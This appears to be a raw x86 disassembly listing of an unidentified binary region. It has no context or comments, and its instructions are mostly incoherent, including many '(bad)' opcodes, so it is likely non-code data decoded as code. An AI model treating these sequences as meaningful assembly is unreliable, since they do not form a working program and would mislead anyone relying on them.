  41a4f5:	cmp    al,0x65
  41a4f7:	into   
  41a4f8:	data16 rol BYTE PTR [esi+ecx*8+0x5f],1
  41a4fd:	imul   edi,DWORD PTR gs:[ebx-0x1685ccc3],0x0
	...
  41a515:	add    BYTE PTR [eax],al
  41a517:	add    BYTE PTR [edi+0x41],bl
  41a51a:	js     0x41a4d5
  41a51c:	push   esp
  41a51d:	inc    esi
  41a51e:	jl     0x41a509
  41a520:	pop    edi
  41a521:	inc    ecx
  41a522:	js     0x41a4cc
  41a524:	xor    BYTE PTR ds:0x44459465,dh
  41a52a:	or     BYTE PTR [eax],al
  41a52c:	cmc    
  41a52d:	in     al,dx
  41a52e:	fs push eax
  41a530:	add    al,0xc9
  41a532:	ja     0x41a5ab
  41a534:	adc    cl,dl
  41a536:	push   0x78e72600
  41a53b:	jo     0x41a4f3
  41a53d:	out    dx,eax
  41a53e:	jbe    0x41a5b6
  41a540:	dec    eax
  41a541:	(bad)  
  41a542:	hlt    
  41a543:	push   edx
  41a544:	push   eax
  41a545:	les    esp,FWORD PTR [eax+edx*2-0x5e]
  41a549:	(bad)  
  41a54a:	js     0x41a54c
  41a54c:	jbe    0x41a535
  41a54e:	js     0x41a5c0
  41a550:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a551:	mov    ecx,0xea886f67
  41a556:	js     0x41a558
  41a558:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a559:	out    0x78,eax
  41a55b:	jo     0x41a5d2
  41a55d:	mov    bl,0x77
  41a55f:	jae    0x41a4fb
  41a561:	in     eax,dx
  41a562:	jbe    0x41a5c8
  41a564:	mov    ch,0xb2
  41a566:	arpl   WORD PTR [bp+si+0x62be],sp
  41a56b:	je     0x41a530
  41a56d:	mov    eax,0xb2a5676a
  41a572:	arpl   WORD PTR [bp+si+0x62bf],dx
  41a577:	je     0x41a5bc
  41a579:	mov    eax,0x6e6a
	...
  41a58e:	add    BYTE PTR [eax],al
  41a590:	xlat   BYTE PTR gs:[ebx]
  41a592:	inc    esi
  41a593:	popa   
  41a594:	pop    ecx
  41a595:	push   es
  41a596:	push   esi
  41a597:	imul   edx,DWORD PTR [ecx-0x6d],0xee4d5454
  41a59e:	adc    al,0x42
  41a5a0:	inc    esp
  41a5a1:	mov    edi,0xebf60015
  41a5a6:	push   0x74
  41a5a8:	or     dh,BYTE PTR [edx-0x16ee9a8a]
  41a5ae:	dec    ebp
  41a5af:	push   esp
  41a5b0:	push   ecx
  41a5b1:	fild   QWORD PTR [ebp+eiz*2+0x45]
  41a5b5:	fst    DWORD PTR [ebp+0x74]
  41a5b8:	mov    esp,ds
  41a5ba:	or     BYTE PTR [ecx-0x4d],dl
  41a5bd:	pop    ss
  41a5be:	in     eax,0x74
  41a5c0:	lods   eax,DWORD PTR ds:[esi]
  41a5c1:	dec    ebx
  41a5c2:	(bad)  
  41a5c3:	pop    ebx
  41a5c4:	mov    esi,0x605bc504
  41a5c9:	adc    eax,0x1c4e1fd6
  41a5ce:	in     eax,0x1e
  41a5d0:	pop    eax
  41a5d1:	nop
  41a5d2:	stc    
  41a5d3:	bound  edi,QWORD PTR [esi+0x6a]
  41a5d6:	sub    al,0x64
  41a5d8:	jno    0x41a647
  41a5da:	fnsave [ebx-0x74]
  41a5dd:	xchg   ch,bl
  41a5df:	jno    0x41a648
  41a5e1:	fisub  WORD PTR fs:[esp+ebp*4+0x79]
  41a5e6:	shl    DWORD PTR [ecx+0x31],cl
  41a5e9:	pop    edx
  41a5ea:	clc    
  41a5eb:	ins    BYTE PTR es:[edi],dx
  41a5ec:	test   BYTE PTR ds:[eax+edx*2],cl
  41a5f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a5f2:	aad    0x71
	...
  41a608:	sub    eax,0x1e66c8a0
  41a60d:	mov    ebp,0xcf196cc9
  41a612:	in     al,0xff
  41a614:	dec    edi
  41a615:	mov    al,ds:0xa1195ed6
  41a61a:	clc    
  41a61b:	dec    edi
  41a61d:	xchg   esp,eax
  41a61e:	cli    
  41a61f:	pop    ds
  41a620:	scas   eax,DWORD PTR es:[edi]
  41a621:	fcom   st(4)
  41a623:	(bad)  
  41a624:	fimul  WORD PTR [eax]
  41a626:	lds    ecx,FWORD PTR [edi-0x54]
  41a629:	clc    
  41a62a:	iret   
  41a62b:	pop    esi
  41a62c:	cmc    
  41a62d:	xlat   BYTE PTR ds:[ebx]
  41a62e:	sub    BYTE PTR [edi],bh
  41a630:	call   0xdfa49d0c
  41a635:	or     cl,BYTE PTR [ecx]
  41a637:	push   ecx
  41a638:	shl    DWORD PTR [edi],0xd9
  41a63b:	pop    ds
  41a63c:	fnstsw ax
  41a63e:	div    BYTE PTR [ebp-0x57]
  41a641:	or     DWORD PTR [ecx],ecx
  41a643:	push   eax
  41a644:	retf   
  41a645:	xchg   esp,eax
  41a646:	scas   eax,DWORD PTR es:[edi]
  41a647:	xor    ch,BYTE PTR [ecx+eiz*2-0x74]
  41a64b:	icebp  
  41a64c:	mov    eax,ds:0xbc039137
  41a651:	pop    ebp
  41a652:	scas   eax,DWORD PTR es:[edi]
  41a653:	xor    ch,BYTE PTR [edi+eiz*2+0x72]
  41a657:	loopne 0x41a5f6
  41a659:	je     0x41a600
  41a65b:	in     al,0x76
  41a65d:	aaa    
  41a65e:	(bad)  
  41a660:	push   esi
  41a661:	push   0x415f238f
  41a666:	inc    esp
  41a667:	repnz xchg ebx,eax
  41a669:	pop    esi
  41a66a:	inc    eax
  41a66b:	fld    DWORD PTR [eax]
	...
  41a67d:	add    BYTE PTR [eax],al
  41a67f:	add    BYTE PTR [esi-0x6c],ch
  41a682:	sub    eax,0xff643fb6
  41a687:	shl    BYTE PTR [esi+0x33],0x58
  41a68b:	fdiv   DWORD PTR [ebx+0x53]
  41a68e:	dec    ebx
  41a68f:	loopne 0x41a6ce
  41a691:	aaa    
  41a692:	xor    dh,bl
  41a694:	ret    
  41a695:	pop    edi
  41a696:	adc    eax,0x34744bd0
  41a69b:	repz cs inc edx
  41a69e:	mov    edi,0x43f4ab5
  41a6a3:	add    al,0x52
  41a6a5:	pop    esi
  41a6a6:	cmp    edx,esp
  41a6a8:	jnp    0x41a70b
  41a6aa:	add    al,0xf2
  41a6ac:	sbb    DWORD PTR [edi],esi
  41a6ae:	icebp  
  41a6af:	add    edx,ebx
  41a6b1:	pop    edi
  41a6b2:	and    ah,dl
  41a6b4:	mov    ds:0x1f20c61,eax
  41a6b9:	cmp    cl,dl
  41a6bb:	add    ecx,ebx
  41a6bd:	pop    edi
  41a6be:	mov    al,ds:0xd2678bd3
  41a6c3:	loopne 0x41a6a2
  41a6c5:	je     0x41a65c
  41a6c7:	in     al,0xe6
  41a6c9:	aaa    
  41a6ca:	ffreep st(0)
  41a6cc:	out    0x33,al
  41a6ce:	fcom   st(7)
  41a6d0:	dec    ebx
  41a6d1:	push   ebp
  41a6d2:	or     BYTE PTR [ebp-0x6bd7a2ad],bl
  41a6d8:	xor    bh,BYTE PTR ds:[edx-0x17]
  41a6dc:	mul    DWORD PTR [eax+0x5c]
  41a6df:	mov    ecx,0x9b6b636f
	...
  41a6f8:	xor    DWORD PTR [edx],esi
  41a6fa:	jp     0x41a6c5
  41a6fc:	cmp    al,0x63
  41a6fe:	inc    esp
  41a6ff:	jmp    0xba9a0743
  41a704:	scas   eax,DWORD PTR es:[edi]
  41a705:	popa   
  41a706:	jns    0x41a694
  41a708:	std    
  41a709:	int3   
  41a70a:	aas    
  41a70b:	pushf  
  41a70c:	rcr    BYTE PTR [eax+ebp*1+0x3c],1
  41a710:	std    
  41a711:	xor    DWORD PTR [edx-0x17],edi
  41a714:	daa    
  41a715:	popa   
  41a716:	pop    esp
  41a717:	cmp    DWORD PTR [ebx],ebx
  41a719:	outs   dx,BYTE PTR ds:[esi]
  41a71a:	pop    edi
  41a71b:	cmp    eax,0x4c7961b0
  41a720:	fisubr WORD PTR [esi+eax*2+0x831e348]
  41a727:	and    esp,ebx
  41a729:	pusha  
  41a72a:	pop    eax
  41a72b:	sbb    al,0xaf
  41a72d:	xor    eax,0x31dcc964
  41a732:	jp     0x41a74b
  41a734:	retf   
  41a735:	inc    edx
  41a736:	or     BYTE PTR [edx],bh
  41a738:	(bad)  [eax+0x58]
  41a73b:	leave  
  41a73c:	retf   0x6b43
  41a73f:	sti    
  41a740:	(bad)  
  41a741:	xchg   esp,eax
  41a742:	pop    eax
  41a743:	cs pusha 
  41a745:	test   DWORD PTR [eax],ebp
  41a747:	sbb    DWORD PTR [ecx+0x46],ebx
  41a74a:	jl     0x41a735
  41a74c:	pop    esp
  41a74d:	pop    edi
  41a74e:	pop    esp
  41a74f:	mov    ecx,0xdb6564af
  41a754:	jnp    0x41a722
  41a756:	aas    
  41a757:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a758:	dec    esi
  41a759:	pop    esp
  41a75a:	sub    BYTE PTR [ecx+0x0],bh
	...
  41a770:	inc    eax
  41a771:	inc    esi
  41a772:	jl     0x41a774
  41a774:	gs cwde 
  41a776:	pop    eax
  41a777:	dec    edi
  41a778:	and    eax,0x54502885
  41a77d:	lds    esi,FWORD PTR [edi+0x77]
  41a780:	cli    
  41a781:	lds    ebp,FWORD PTR [eax+0x32]
  41a784:	and    eax,0xe541420f
  41a789:	ja     0x41a7e3
  41a78b:	popa   
  41a78c:	push   es
  41a78d:	lds    edi,FWORD PTR [ebx+0x6f]
  41a790:	imul   ebx
  41a792:	ss add bl,bl
  41a795:	add    DWORD PTR [ecx+0x50],ebx
  41a798:	aad    0xe7
  41a79a:	push   ebp
  41a79b:	jae    0x41a723
  41a79d:	mov    eax,0x86117263
  41a7a2:	or     BYTE PTR [eax-0x4f],cl
  41a7a5:	in     al,0x44
  41a7a7:	dec    ebp
  41a7a8:	push   esp
  41a7a9:	out    dx,eax
  41a7aa:	pusha  
  41a7ab:	and    BYTE PTR [ebp+0x427377b7],ah
  41a7b1:	loope  0x41a829
  41a7b3:	xlat   BYTE PTR fs:[ebx]
  41a7b5:	xchg   edi,eax
  41a7b6:	push   edi
  41a7b7:	dec    ebp
  41a7b8:	mov    eax,ds:0x545014e0
  41a7bd:	lds    esi,FWORD PTR [edi+0x77]
  41a7c0:	jp     0x41a788
  41a7c2:	push   0x5897a532
  41a7c7:	dec    edi
  41a7c8:	test   DWORD PTR gs:[eax],ebp
  41a7cb:	push   eax
  41a7cc:	xchg   esp,eax
  41a7cd:	lds    esi,FWORD PTR [edi+0x77]
  41a7d0:	call   0x0:0x68c5
	...
  41a7e7:	add    BYTE PTR [ebx+eax*1+0x36],bl
  41a7eb:	push   eax
  41a7ec:	push   ebp
  41a7ed:	out    0x55,eax
  41a7ef:	jae    0x41a777
  41a7f1:	mov    eax,0x90917263
  41a7f6:	inc    esi
  41a7f7:	dec    esi
  41a7f8:	xor    edi,esp
  41a7fa:	adc    al,0x50
  41a7fc:	push   esp
  41a7fd:	les    esi,FWORD PTR [edi+0x77]
  41a800:	mov    edx,ss
  41a802:	mul    BYTE PTR [ebx-0x74]
  41a805:	cmc    
  41a806:	les    edx,FWORD PTR [ebx-0x44]
  41a809:	popf   
  41a80a:	fcomp  QWORD PTR [esi-0x41]
  41a80d:	push   cs
  41a80e:	in     al,0x6c
  41a810:	mov    esi,0xc95108d9
  41a815:	and    ecx,ebx
  41a817:	pop    ds
  41a818:	fcomp  QWORD PTR [eax+edi*8]
  41a81b:	jo     0x41a7c0
  41a81d:	sbb    dh,bh
  41a81f:	arpl   WORD PTR [ebp+edi*4+0x21b26cd7],cx
  41a826:	in     al,0x5e
  41a828:	sahf   
  41a829:	sbb    ch,cl
  41a82b:	dec    edx
  41a82c:	jne    0x41a84c
  41a82e:	imul   DWORD PTR [edi+edi*2+0x12]
  41a832:	shl    DWORD PTR [ebx+0x58],cl
  41a835:	hlt    
  41a836:	fidiv  DWORD PTR [ebx+0x69]
  41a839:	outs   dx,DWORD PTR ds:[esi]
  41a83a:	cli    
  41a83b:	bound  esp,QWORD PTR [eax-0x63]
  41a83e:	retf   
  41a83f:	pusha  
  41a840:	outs   dx,DWORD PTR ds:[esi]
  41a841:	push   edx
  41a842:	iret   
  41a843:	ins    DWORD PTR es:[edi],dx
  41a844:	pusha  
  41a845:	popf   
  41a846:	xlat   BYTE PTR ds:[ebx]
  41a847:	pop    esi
  41a848:	bound  ebx,QWORD PTR [ecx+eiz*8+0x62]
	...
  41a860:	ds test eax,0x522f60cb
  41a866:	iret   
  41a867:	ins    DWORD PTR es:[edi],dx
  41a868:	inc    eax
  41a869:	mov    cs,WORD PTR [edi+eax*2]
  41a86c:	sub    BYTE PTR [eax-0x5eca8c06],bl
  41a872:	jecxz  0x41a8d6
  41a874:	pop    ds
  41a875:	mov    ebp,0xa1326cbd
  41a87a:	rcr    DWORD PTR [esi+0x1e],1
  41a87d:	cwde   
  41a87e:	enter  0xf54a,0x9e
  41a882:	fisubr WORD PTR [edi+edi*8-0x6e]
  41a886:	loop   0x41a8fb
  41a888:	fsubr  DWORD PTR [edx-0x6b1a9a1e]
  41a88e:	ret    0xc7e8
  41a891:	pop    ecx
  41a892:	(bad)  
  41a894:	idiv   DWORD PTR [ecx]
  41a896:	into   
  41a897:	out    dx,al
  41a898:	mov    bh,0x59
  41a89a:	xchg   esp,eax
  41a89b:	int3   
  41a89c:	jae    0x41a8f1
  41a89e:	ret    0xb8e6
  41a8a1:	aas    
  41a8a2:	(bad)
  41a8a5:	push   edi
  41a8a6:	shl    cl,0xda
  41a8a9:	xor    esp,ecx
  41a8ab:	aad    0xd7
  41a8ad:	push   ebx
  41a8ae:	and    dh,0xb8
  41a8b1:	aas    
  41a8b2:	test   edi,edx
  41a8b4:	pushf  
  41a8b5:	xchg   esp,eax
  41a8b6:	mov    dl,0xf2
  41a8b8:	mov    cl,0x40
  41a8ba:	sahf   
  41a8bb:	in     al,0x9d
  41a8bd:	das    
  41a8be:	stos   DWORD PTR es:[edi],eax
  41a8bf:	shl    BYTE PTR [edx+0x35],1
  41a8c2:	jno    0x41a8b6
	...
  41a8d8:	jl     0x41a913
  41a8da:	test   edi,edx
  41a8dc:	push   edi
  41a8dd:	popa   
  41a8de:	mov    cl,dh
  41a8e0:	outs   dx,DWORD PTR ds:[esi]
  41a8e1:	cmp    DWORD PTR [esi-0x29],edx
  41a8e4:	mov    ebx,DWORD PTR [edx+0x3b]
  41a8e7:	ror    BYTE PTR [edi+edi*1+0x51],0xd6
  41a8ec:	outs   dx,BYTE PTR ds:[esi]
  41a8ed:	cmp    bl,BYTE PTR [ebx-0x46]
  41a8f0:	outs   dx,BYTE PTR ds:[esi]
  41a8f1:	inc    esi
  41a8f2:	xor    ch,ch
  41a8f4:	cmp    BYTE PTR [edx],bh
  41a8f6:	adc    edi,DWORD PTR [ebx-0xcbcc5d6]
  41a8fc:	inc    eax
  41a8fd:	inc    ebp
  41a8fe:	call   eax
  41a900:	cs inc ebp
  41a902:	adc    ah,ch
  41a904:	xor    BYTE PTR [ebx],bh
  41a906:	add    eax,0x146583eb
  41a90b:	out    0x1c,al
  41a90d:	dec    ebx
  41a90e:	adc    bl,al
  41a910:	cs aaa 
  41a912:	sub    esi,DWORD PTR [ebp+edi*8-0x812f2c7]
  41a919:	das    
  41a91a:	or     dl,bh
  41a91c:	cmp    ebx,DWORD PTR [esi+0x5f]
  41a91f:	or     bl,BYTE PTR [edx+0x38]
  41a922:	jns    0x41a8fa
  41a924:	jne    0x41a96b
  41a926:	sub    BYTE PTR [esi-0x399bbabc],ch
  41a92c:	pop    esi
  41a92d:	cmp    al,0x28
  41a92f:	mov    al,ds:0xbb6b455d
  41a934:	cmp    eax,0xfb097c36
  41a939:	xor    eax,0xbd7c
	...
  41a94e:	add    BYTE PTR [eax],al
  41a950:	sub    BYTE PTR [edi],dh
  41a952:	ins    DWORD PTR es:[edi],dx
  41a953:	mov    edx,0x8f65638f
  41a958:	inc    ebx
  41a959:	inc    eax
  41a95a:	addr16 fwait
  41a95c:	xor    al,0x6d
  41a95e:	inc    ebx
  41a95f:	xor    BYTE PTR [edx],0x43
  41a962:	gs call 0x3246:0xa57c2f1e
  41a96a:	test   si,di
  41a96d:	aas    
  41a96e:	jns    0x41a939
  41a970:	frstor [esp+edx*2-0x56]
  41a974:	aam    0x42
  41a976:	jp     0x41a9c4
  41a978:	fiadd  WORD PTR [esi+ebx*2+0x44]
  41a97c:	mov    edx,0xde465f43
  41a981:	ins    BYTE PTR es:[edi],dx
  41a982:	pop    ebp
  41a983:	inc    eax
  41a984:	fidiv  WORD PTR [eiz*2+0x43a8e13e]
  41a98b:	inc    esp
  41a98c:	fld    DWORD PTR [ebx+0x67]
  41a98f:	dec    esi
  41a990:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a991:	ss ins DWORD PTR es:[edi],dx
  41a993:	or     ecx,edi
  41a995:	inc    ebp
  41a996:	push   0x1a
  41a998:	mov    DWORD PTR [ebx+0x7c],0x586cb304
  41a99f:	sbb    ebx,DWORD PTR [ebp-0x5502a0d2]
  41a9a5:	inc    ebx
  41a9a6:	push   esp
  41a9a7:	add    dl,al
  41a9a9:	fistp  QWORD PTR [eax+0x6c]
  41a9ac:	xchg   edx,eax
  41a9ad:	lds    ebx,FWORD PTR [edi+0x0]
  41a9b0:	xchg   esi,eax
  41a9b1:	lds    ebp,FWORD PTR [edx+0x74]
	...
  41a9c8:	jp     0x41a97d
  41a9ca:	jbe    0x41aa31
  41a9cc:	push   ecx
  41a9cd:	xlat   BYTE PTR ds:[ebx]
  41a9ce:	ins    DWORD PTR es:[edi],dx
  41a9cf:	arpl   WORD PTR [edi-0x3b],ax
  41a9d2:	ja     0x41aa43
  41a9d4:	dec    ebx
  41a9d5:	loopne 0x41aa27
  41a9d7:	dec    ecx
  41a9d8:	adc    esp,eax
  41a9da:	imul   esi,DWORD PTR [edx+0x63],0xf42078af
  41a9e1:	mov    al,0x67
  41a9e3:	outs   dx,DWORD PTR ds:[esi]
  41a9e4:	clc    
  41a9e5:	lds    edi,FWORD PTR [eax+0x20]
  41a9e8:	adc    BYTE PTR [ebx-0x50e59e9e],dh
  41a9ee:	jbe    0x41a9f0
  41a9f0:	repnz fidivr WORD PTR [eax+0x6c]
  41a9f4:	adc    al,ch
  41a9f6:	pop    edi
  41a9f7:	add    cl,ah
  41a9f9:	shl    BYTE PTR [edi+0x63],cl
  41a9fc:	and    bl,bh
  41a9fe:	bound  esi,QWORD PTR [esi+eax*4-0x6d]
  41aa02:	ins    DWORD PTR es:[edi],dx
  41aa03:	fs or  dh,al
  41aa06:	js     0x41aa71
  41aa08:	or     edi,DWORD PTR [ebx-0x44b69e99]
  41aa0e:	arpl   WORD PTR [esi-0xb],bp
  41aa11:	mov    edx,0xec536568
  41aa16:	ins    DWORD PTR es:[edi],dx
  41aa17:	je     0x41aa55
  41aa19:	mov    bh,0x6b
  41aa1b:	jb     0x41a9d2
  41aa1d:	mov    edx,0xb1796562
  41aa22:	arpl   WORD PTR [ebp+0x50],bp
  41aa25:	jo     0x41aa9e
  41aa27:	gs ja  0x41aa14
  41aa2a:	imul   esi,DWORD PTR [edx+0x0],0x0
	...
  41aa3d:	add    BYTE PTR [eax],al
  41aa3f:	add    ch,dl
  41aa41:	jecxz  0x41aa98
  41aa43:	jae    0x41a9cb
  41aa45:	in     eax,dx
  41aa46:	arpl   WORD PTR [edx-0x74],si
  41aa49:	cdq    
  41aa4a:	(bad)  
  41aa4c:	and    ah,BYTE PTR [eax-0x61049430]
  41aa52:	jecxz  0x41aa73
  41aa54:	in     eax,dx
  41aa55:	call   0x1fd0:0x90016ceb
  41aa5c:	loope  0x41a9fa
  41aa5e:	cli    
  41aa5f:	pop    esi
  41aa60:	repz fcomp st(2)
  41aa63:	pop    ds
  41aa64:	(bad)  
  41aa66:	(bad)  [eax-0x1d]
  41aa69:	into   
  41aa6a:	fisub  DWORD PTR [ebx-0x21]
  41aa6d:	mov    ebp,0xdfb163e1
  41aa72:	fsub   QWORD PTR [esi-0x48]
  41aa75:	in     al,0xed
  41aa77:	jo     0x41aa05
  41aa79:	add    ch,BYTE PTR [esi]
  41aa7b:	xor    BYTE PTR [ebp+eiz*1+0x26],dh
  41aa7f:	and    ebx,DWORD PTR [ecx+ebp*8-0x50]
  41aa83:	sub    ch,BYTE PTR [ecx-0x13]
  41aa86:	sbb    al,0x58
  41aa88:	imul   ebx,eax,0xd0b43218
  41aa8e:	sbb    BYTE PTR [edx],dh
  41aa90:	fs loopne 0x41aac0
  41aa93:	xor    BYTE PTR [esi-0x41cfd20b],bh
  41aa99:	and    eax,0x25be302e
  41aa9e:	xor    BYTE PTR cs:[esi+0x301f55],bl
	...
  41aab5:	add    BYTE PTR [eax],al
  41aab7:	add    BYTE PTR [esi-0x61cfe0ab],bl
  41aabd:	test   edi,esp
  41aabf:	(bad)  
  41aac0:	aas    
  41aac1:	push   ebp
  41aac2:	iret   
  41aac3:	ins    DWORD PTR es:[edi],dx
  41aac4:	xor    BYTE PTR [eax-0x26],bl
  41aac7:	popa   
  41aac8:	xor    eax,0x57ffe08b
  41aacd:	test   eax,0x512272e4
  41aad2:	fbstp  TBYTE PTR [ecx+0x2e]
  41aad5:	xchg   esp,eax
  41aad6:	sbb    dl,dl
  41aad8:	das    
  41aad9:	xchg   esp,eax
  41aada:	aad    0xc7
  41aadc:	pop    ebx
  41aadd:	xchg   esp,eax
  41aade:	mov    ch,0xcc
  41aae0:	push   ebx
  41aae1:	xchg   esp,eax
  41aae2:	jno    0x41aaae
  41aae4:	retf   
  41aae5:	xchg   esp,eax
  41aae6:	jnp    0x41aab6
  41aae8:	ret    
  41aae9:	xchg   esp,eax
  41aaea:	jmp    0x41aa9d
  41aaec:	mov    ebx,0xb3b7cd94
  41aaf1:	xchg   esp,eax
  41aaf2:	sar    DWORD PTR [ebx+ebp*4-0x5c461f6c],cl
  41aaf9:	xchg   esp,eax
  41aafa:	cli    
  41aafb:	mov    edx,0xc069949b
  41ab00:	xchg   ebx,eax
  41ab01:	xchg   esp,eax
  41ab02:	lods   al,BYTE PTR ds:[esi]
  41ab03:	ror    BYTE PTR [ebx-0x7c40846c],0x94
  41ab0a:	in     al,0xe1
  41ab0c:	jnp    0x41aaa2
  41ab0e:	pop    esi
  41ab0f:	call   0xe6df3f87
  41ab14:	imul   edx,DWORD PTR [eax+eax*1-0xc6b9c19],0xffffffeb
	...
  41ab30:	pop    ebx
  41ab31:	xchg   esp,eax
  41ab32:	jne    0x41ab20
  41ab34:	push   ebx
  41ab35:	xchg   esp,eax
  41ab36:	stc    
  41ab37:	in     al,dx
  41ab38:	retf   
  41ab39:	xchg   esp,eax
  41ab3a:	in     al,dx
  41ab3b:	jmp    0x94bb:0xeaa594c3
  41ab42:	pop    ds
  41ab43:	out    dx,al
  41ab44:	mov    bl,0x94
  41ab46:	push   edi
  41ab47:	aad    0xab
  41ab49:	xchg   esp,eax
  41ab4a:	mov    ds:0x9694a3d2,al
  41ab4f:	xlat   BYTE PTR ds:[ebx]
  41ab50:	fwait
  41ab51:	xchg   esp,eax
  41ab52:	ins    DWORD PTR es:[edi],dx
  41ab53:	fcom   DWORD PTR [ebx-0x742aab6c]
  41ab59:	xchg   esp,eax
  41ab5a:	mov    bl,bl
  41ab5c:	adc    DWORD PTR [ecx+ebp*1+0x8947be0],0xffffff8a
  41ab64:	rol    DWORD PTR [ebp-0x7a531df8],cl
  41ab6a:	or     BYTE PTR [edi-0x3d],al
  41ab6d:	test   DWORD PTR [eax],ecx
  41ab6f:	inc    esi
  41ab70:	mov    edx,0x6140885
  41ab75:	push   ebp
  41ab76:	or     BYTE PTR [eax+0x1c],ah
  41ab79:	push   esp
  41ab7a:	or     BYTE PTR [eax],ah
  41ab7c:	adc    dl,BYTE PTR [eax+ecx*1-0x1]
  41ab80:	not    BYTE PTR [eax+ecx*1-0x14]
  41ab84:	repz push esp
  41ab86:	or     BYTE PTR [edx],dh
  41ab88:	jmp    0x41abde
  41ab8a:	or     BYTE PTR [ebx+0x3008540c],ch
  41ab90:	or     al,0x54
  41ab92:	or     BYTE PTR [ecx+0x0],bh
	...
  41aba8:	rcl    DWORD PTR [eax+ecx*1+0x2d],1
  41abac:	leave  
  41abad:	push   esp
  41abae:	or     bh,al
  41abb0:	ret    0x854
  41abb3:	cmp    eax,0x9f0854ba
  41abb8:	out    dx,eax
  41abb9:	push   ebx
  41abba:	or     BYTE PTR [eax-0x11],bl
  41abbd:	push   ebx
  41abbe:	or     BYTE PTR [edx],bh
  41abc0:	not    DWORD PTR [ebx+0x8]
  41abc3:	fsub   st(1),st
  41abc5:	push   ebx
  41abc6:	or     BYTE PTR [edi+0x100853e1],al
  41abcc:	sub    dl,BYTE PTR [eax+ecx*1-0x2d]
  41abd0:	dec    edi
  41abd1:	push   esp
  41abd2:	or     BYTE PTR [edx+0xf08544f],ah
  41abd8:	dec    edi
  41abd9:	push   esp
  41abda:	or     dh,dl
  41abdc:	push   eax
  41abdd:	push   esp
  41abde:	or     BYTE PTR [ecx],dh
  41abe0:	dec    edi
  41abe1:	push   esp
  41abe2:	or     BYTE PTR [eax+0x4f],ah
  41abe5:	push   esp
  41abe6:	or     BYTE PTR [ebx-0x69f7abb1],dh
  41abec:	dec    esi
  41abed:	push   esp
  41abee:	or     BYTE PTR [eax],al
  41abf0:	je     0x41ac45
  41abf2:	dec    eax
  41abf3:	add    BYTE PTR [esi+0x5100484d],ch
  41abf9:	dec    ebp
  41abfa:	dec    eax
  41abfb:	add    BYTE PTR [ebx],al
  41abfd:	dec    ebp
  41abfe:	dec    eax
  41abff:	add    BYTE PTR [ebx+0x4e],bl
  41ac02:	dec    eax
  41ac03:	add    BYTE PTR [eax+0x4f],al
  41ac06:	dec    eax
  41ac07:	add    BYTE PTR [esi+0x4858],dl
	...
  41ac1d:	add    BYTE PTR [eax],al
  41ac1f:	add    cl,dh
  41ac21:	push   eax
  41ac22:	dec    eax
  41ac23:	add    dl,ch
  41ac25:	dec    edi
  41ac26:	dec    eax
  41ac27:	add    BYTE PTR [esi+ecx*2+0x48],ch
  41ac2b:	add    BYTE PTR [ebx],ah
  41ac2d:	push   esp
  41ac2e:	dec    eax
  41ac2f:	add    BYTE PTR [esi],bh
  41ac31:	push   edx
  41ac32:	dec    eax
  41ac33:	add    al,dh
  41ac35:	xchg   DWORD PTR [eax+0x0],ecx
  41ac38:	mov    esp,0xa4004887
  41ac3d:	mov    ecx,DWORD PTR [eax+0x0]
  41ac40:	test   eax,0x3c004889
  41ac45:	jle    0x41ac8f
  41ac47:	add    BYTE PTR [edi],dl
  41ac49:	jle    0x41ac93
  41ac4b:	add    BYTE PTR [ebx+0x54],ah
  41ac4e:	dec    eax
  41ac4f:	add    BYTE PTR [edx-0x7d],cl
  41ac52:	dec    eax
  41ac53:	add    BYTE PTR [eax+0x79004883],bl
  41ac59:	or     DWORD PTR [eax+0x0],0xffffffff
  41ac5d:	or     DWORD PTR [eax+0x0],0x48829d
  41ac64:	xor    DWORD PTR ds:0x36870048,0x34d60048
  41ac6e:	dec    eax
  41ac6f:	add    ah,bl
  41ac71:	xor    al,0x48
  41ac73:	add    BYTE PTR [edi+0x2c],bh
  41ac76:	dec    eax
  41ac77:	add    BYTE PTR [ebx],dh
  41ac79:	cmp    cl,BYTE PTR [eax+0x0]
  41ac7c:	mov    ecx,gs
  41ac7e:	push   0x40
  41ac80:	mov    WORD PTR [edi+0x406b],ds
	...
  41ac96:	add    BYTE PTR [eax],al
  41ac98:	mov    WORD PTR [ebx+0x61],gs
  41ac9b:	inc    eax
  41ac9c:	mov    esp,?
  41ac9e:	fs inc eax
  41aca0:	mov    WORD PTR [ebx+0x63],cs
  41aca3:	inc    eax
  41aca4:	mov    WORD PTR [esi+0x5d],ss
  41aca7:	inc    eax
  41aca8:	mov    WORD PTR [edi-0x5273bfa2],es
  41acae:	or     BYTE PTR [eax],al
  41acb0:	mov    WORD PTR [ebp-0x5273fff8],gs
  41acb6:	or     BYTE PTR [eax],al
  41acb8:	mov    WORD PTR [ebp-0x5273fff8],gs
  41acbe:	or     BYTE PTR [eax],al
  41acc0:	mov    WORD PTR [esi-0x8],gs
  41acc3:	data16 icebp 
  41acc5:	ret    
  41acc6:	fcomp  QWORD PTR [edi]
  41acc8:	aam    0xcc
  41acca:	xlat   BYTE PTR ds:[ebx]
  41accb:	addr16 mov esi,?
  41acce:	mov    esp,0xb800b83e
  41acd3:	sub    dl,ch
  41acd5:	and    BYTE PTR [ecx+0x2621de4c],bh
  41acdb:	dec    ebp
  41acdc:	(bad)  
  41acdd:	lods   eax,DWORD PTR ds:[esi]
  41acde:	sub    eax,0xd0d06264
  41ace3:	bound  ecx,QWORD PTR [eax+ebx*4-0x523bcde4]
  41acea:	fdiv   QWORD PTR [ecx-0x5f]
  41aced:	sbb    BYTE PTR [ecx],cl
  41acef:	push   ecx
  41acf0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41acf1:	adc    ch,ah
  41acf3:	imul   edx,DWORD PTR [ecx+0x25],0xffffffee
  41acf7:	pusha  
  41acf8:	jns    0x41ad3b
  41acfa:	out    dx,al
  41acfb:	add    BYTE PTR ds:[eax],al
	...
  41ad0e:	add    BYTE PTR [eax],al
  41ad10:	mov    WORD PTR [edi+eiz*8],cs
  41ad13:	pusha  
  41ad14:	push   0x605ee6db
  41ad19:	lods   eax,DWORD PTR ds:[esi]
  41ad1a:	add    DWORD PTR [edi],eax
  41ad1c:	xchg   ecx,eax
  41ad1d:	xchg   esp,eax
  41ad1e:	stc    
  41ad1f:	or     BYTE PTR [esi+0x6b1dff8d],al
  41ad25:	cs dec edx
  41ad27:	and    al,0x97
  41ad29:	mov    ?,edi
